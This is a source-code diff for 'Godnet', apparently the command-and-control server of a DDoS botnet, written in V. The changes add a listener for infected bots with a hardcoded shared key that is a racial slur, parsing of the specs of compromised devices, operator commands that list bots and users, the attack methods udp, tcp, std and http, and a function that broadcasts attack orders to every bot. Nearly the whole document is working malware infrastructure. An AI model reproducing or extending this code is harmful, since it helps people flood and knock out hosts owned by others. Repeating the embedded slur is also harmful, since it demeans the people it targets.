@@ -19,6 +19,7 @@ import src as gn
 
 pub const (
 	banner = "╔═╗╔═╗╔╦╗╔╗╔╔═╗╔╦╗\r\n║ ╦║ ║ ║║║║║║╣  ║ \r\n╚═╝╚═╝═╩╝╝╚╝╚═╝ ╩ \r\n"
+	
 	help	= "Name              Description\r
 ____________________________________________\r
 Help		  List of help commands\r
@@ -33,6 +34,8 @@ Attack		  Attack a host\r
 	- method  Attack Method\r
 Admin		  List of admin commands\r\n"
 	hostname = "[{USERNAME}@Godnet]# ~"
+
+	methods = "\rudp\n\rtcp\n\rstd\n\rhttp\n\r"
 )
 
 pub struct Client
@@ -53,7 +56,12 @@ pub struct Bot
 {
 	pub mut:
 		nickname	string
-		info		[]string // os, arch, cpu, ram etc
+		os			string
+		cpu			string
+		arch		string
+		cores 		string
+		ram 		string
+		uname 		string
 		ip			string // 
 		port		int
 		socket		net.TcpConn
@@ -67,6 +75,7 @@ pub struct Godnet
 		port 		int
 
 		/* Database && Configuration Information */
+		bot_key		string = "NIGGERBOB"
 		bots		[]Bot
 		apis		[]gn.API
 		users 		[]gn.User
@@ -83,9 +92,18 @@ fn main()
 	}
 
 	mut g := start_godnet(args[1].int())
+	spawn bot_listener(mut &g)
 	listener(mut &g)
 
 	time.sleep(time.infinite)
+}
+
+fn (mut g Godnet) title_handler(mut c net.TcpConn, client Client)
+{
+	for {
+		gn.set_title(mut c, "Godnet :: Devices [${g.bots.len}] :: Logged in as: ${client.info.name}")
+		time.sleep(1*time.second)
+	}
 }
 
 fn start_godnet(port int) Godnet
@@ -98,26 +116,25 @@ fn start_godnet(port int) Godnet
 	println("${gn.success_sym} Loading Godnet's User Database....")
 	for user in db 
 	{
-		user_info := user.replace("(", "").replace(")", "").replace("'", "").split(",")
-
-		if user_info.len == 9 {
-			g.users << gn.user(user_info)
-		}
+		user_info 	:= user.replace("(", "").replace(")", "").replace("'", "").split(",")
+		if user_info.len == 9 { g.users << gn.user(user_info) }
 	}
 
 	println("${gn.success_sym} Godnet user database loaded....\n${gn.success_sym} Loading APIs!")
 
-	mut apis := g.strip_json_comments(os.read_file("assets/apis.json") or { "" })
-	mut json_apis := (json.raw_decode("${apis}") or { json.Any{} }).as_map()
+	mut apis 		:= g.strip_json_comments(os.read_file("assets/apis.json") or { "" })
+	mut json_apis 	:= (json.raw_decode("${apis}") or { json.Any{} }).as_map()
 
 	for key, val in json_apis {
 		api_info := (json.raw_decode("${val}") or { json.Any{} }).as_map()
-		g.apis << gn.API{name: 		key,
-					  toggle: 		(api_info['TOGGLE'] 		or { "" }).bool(),
-					  url: 			(api_info['URL'] 			or { "" }).str(),
-					  cons: 		(api_info['CONS'] 			or { "" }).int(),
-					  max_attack: 	(api_info['MAX_ATTACK'] 	or { "" }).int(),
-					  max_time: 	(api_info['MAX_TIME'] 		or { "" }).int()}
+		g.apis << gn.API{
+			name: 		key,
+			toggle: 	(api_info['TOGGLE'] 		or { "" }).bool(),
+			url: 		(api_info['URL'] 			or { "" }).str(),
+			cons: 		(api_info['CONS'] 			or { "" }).int(),
+			max_attack: (api_info['MAX_ATTACK'] 	or { "" }).int(),
+			max_time: 	(api_info['MAX_TIME'] 		or { "" }).int()
+		}
 	}
 
 	println("${gn.success_sym} APIs completed loaded up.....\r\n${gn.success_sym} Starting Godnet server.....!")
@@ -136,13 +153,12 @@ fn start_godnet(port int) Godnet
 
 	println("${gn.success_sym} Godnet bot server successfully started.....!")
 
-	spawn bot_listener(mut &g)
-
 	return g
 }
 
 fn listener(mut g Godnet)
 {
+	println("${gn.success_sym} Listening for users.....!")
 	for 
 	{
 		mut client := g.socket.accept() or {
@@ -156,6 +172,7 @@ fn listener(mut g Godnet)
 
 fn bot_listener(mut g Godnet)
 {
+	println("${gn.success_sym} Listening for bots.....!")
 	for {
 		mut bot_c := g.bot_sock.accept() or {
 			println("[ X ] Error, Unable to accept bot connection")
@@ -172,42 +189,54 @@ fn (mut g Godnet) bot_handler(mut bot_c net.TcpConn)
 	bot_ip 			:= bot_c.peer_ip() or { "" }
 
 	secret_key		:= bot_reader.read_line() or { "" }
-	device_info 	:= bot_reader.read_line() or { "" }
+	if secret_key != g.bot_key {
+		bot_c.write_string("[ X ] Error, Invalid secret. Bot was rejected") or { 0 }
+	}
 
-	// validate auth
-	g.bots << Bot{ nickname: gn.randomized_text(15),
+	device_info 	:= bot_reader.read_line() or { "" }
+	if !device_info.starts_with("{") || !device_info.ends_with("}") {
+		bot_c.write_string("[ X ] Error, Invalid access....!") or { 0 }
+		return
+	}
+
+	mut new_bot := Bot{ nickname: gn.randomized_text(15),
 				   ip: bot_ip,
 				   port: 0, 
 				   socket: bot_c }
 
-	println("Bot has been added! ${g.bots} ${secret_key} ${device_info}")
+	g.parse_bot_specs(mut new_bot, "${device_info}")
+	g.bots << new_bot
+
+	println("Bot has connected to Godnet!")
 }
 
 fn (mut g Godnet) authorize_user(mut client net.TcpConn)
 {
 	mut reader := io.new_buffered_reader(reader: client)
-	mut user_ip := client.peer_ip() or { "" }
+	mut user_ip := client.peer_ip() or { g.disconnect_socket(mut client) return }
+	gn.set_title(mut client, "Login | Username")
 	gn.loading_bar(mut client)
-	
-	// client.write_string("${gn.clear}${gn.c_red}${banner}${gn.c_default}") or { 0 }
 
 	gn.animate_listed_text(mut client, "${gn.c_red}${banner}${gn.c_default}", 150)
 	gn.animate_text(mut client, "${gn.bg_red}${gn.c_white}└►Username:${gn.c_default}${gn.bg_default} ", 60)
-	username := reader.read_line() or { "" }
+	username := reader.read_line() or { g.disconnect_socket(mut client) return }
 
+	gn.set_title(mut client, "Login | Password")
 	gn.animate_text(mut client, "${gn.bg_red}${gn.c_white}└►Password:${gn.c_default}${gn.bg_default} ", 60)
-	password := reader.read_line() or { "" }
+	password := reader.read_line() or { g.disconnect_socket(mut client) return }
 
 	acc := g.find_account(username)
 	login_chk := g.validate_login(username, password)
 	if !login_chk {
 		gn.animate_text(mut client, "${gn.bg_red}${gn.c_white}[ X ] Error, Invalid info provided....!", 60)
 		time.sleep(3*time.second)
+		g.disconnect_socket(mut client)
 		return 
 	}
 
 	mut new_user := Client{ info: acc, io: reader, socket: client }
 	g.clients << new_user
+	spawn g.title_handler(mut client, new_user)
 	g.input_handler(mut new_user)
 }
 
@@ -221,7 +250,7 @@ pub fn (mut g Godnet) input_handler(mut c Client)
 	for 
 	{
 		gn.animate_text(mut c.socket, "${gn.bg_red}${gn.c_white}${g.create_hostname(c.info.name)}${gn.c_default}${gn.bg_default} ", 60)
-		data := c.io.read_line() or { "" }
+		data := c.io.read_line() or { g.disconnect_socket(mut c.socket) return }
 		r := gn.new_cmd(data)
 
 		match r.cmd {
@@ -229,7 +258,13 @@ pub fn (mut g Godnet) input_handler(mut c Client)
 				c.socket.write_string("${help}") or { 0 }
 			} 
 			"methods" {
-				
+				c.socket.write_string("${methods}") or { 0 }
+			}
+			"online" {
+				for i, user in g.clients { c.socket.write_string("${i} | ${user.info.name}\r\n") or { 0 } }
+			}
+			"bots" {
+				for idx, bot in g.bots { c.socket.write_string("${gn.c_red}${idx}${gn.c_default} | ${bot.nickname} | ${bot.os}\r\n\t=> CPU: ${bot.cpu}\r\n\t=> Cores: ${bot.cores} | Ram: ${bot.ram}\r\n") or { 0 } }
 			} else {}
 		}
 
@@ -260,15 +295,71 @@ pub fn (mut g Godnet) execute_action(mut c Client, r gn.Command)
 		}
 		"attack" {
 			c.info.authorize_attack([r.args[1], r.args[2], r.args[3], r.args[4]])
+			g.broadcast_attack(r.data)
 		} else {}
 	}
 }
 
+pub fn (mut g Godnet) disconnect_socket(mut socket net.TcpConn) bool
+{
+	mut c := 0
+	for mut bot in g.bots 
+	{
+		if bot.socket == socket {
+			g.bots.delete(c)
+			println("[ + ] Bot has been disconnected")
+			return true
+		}
+		c++
+	}
+
+	c = 0
+	for mut client in g.clients 
+	{
+		if client.socket == socket {
+			g.clients.delete(c)
+			println("[ + ] User has been disconnected")
+			return true
+		}
+		c++
+	}
+
+	return false
+}
+
+pub fn (mut g Godnet) ping_all_bots()
+{
+	
+}
+
+pub fn (mut g Godnet) parse_bot_specs(mut b Bot, data string)
+{
+	/*
+		{'os': 'Ubuntu"', 
+		'cpu': 'Intel(R) Xeon(R) Gold 6152 CPU @ 2.10GHz', 
+		'arch': 'x86_64', 'cores': '4', 
+		'uname': 'Linux dreadfull 5.15.0-84-generic #93-Ubuntu SMP Tue Sep 5 17:16:10 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
+	*/
+	json_data := data.replace("{", "").replace("}", "").replace("'", "").split(",")
+	
+	b.os 		= json_data[0].replace("os:", "").trim_space()
+	b.cpu 		= json_data[1].replace("cpu:", "").trim_space()
+	b.arch 		= json_data[2].replace("arch:", "").trim_space()
+	b.cores 	= json_data[3].replace("cores:", "").trim_space()
+	b.ram 		= json_data[4].replace("ram:", "").trim_space()
+
+	
+}
+
 pub fn (mut g Godnet) broadcast_attack(data string)
 {
-	for bot in g.bots {
+	mut c := 0
+	for mut bot in g.bots {
 		bot.socket.write_string("${data}\n") or { 0 }
+		c++
 	}
+
+	println("[ + ] Command sent to ${c} bots")
 }
 
 pub fn (mut g Godnet) create_hostname(username string) string
